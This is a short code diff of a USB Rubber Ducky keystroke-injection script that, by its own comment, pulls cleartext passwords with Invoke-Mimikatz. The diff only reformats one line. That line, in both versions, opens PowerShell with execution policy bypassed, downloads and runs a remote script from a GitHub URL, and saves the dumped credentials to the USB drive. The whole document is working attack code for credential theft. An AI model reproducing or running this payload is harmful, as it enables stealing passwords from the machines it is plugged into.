@@ -4,8 +4,7 @@ REM Pulls cleartext passwords with Invoke-Mimikatz and saves output to txt file 
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString
-('https://github.com/secwolf6/Invoke-Mimiduck/raw/master/babayega.ps1');babayega | Out-File -Encoding utf8 -FilePath ((gwmi win32_volume -f 'label=''_''').Name+'output.txt')"
+STRING powershell -exec bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://github.com/secwolf6/Invoke-Mimiduck/raw/master/babayega.ps1');babayega | Out-File -Encoding utf8 -FilePath ((gwmi win32_volume -f 'label=''_''').Name+'output.txt')"
 ENTER
 DELAY 1000
 GUI r
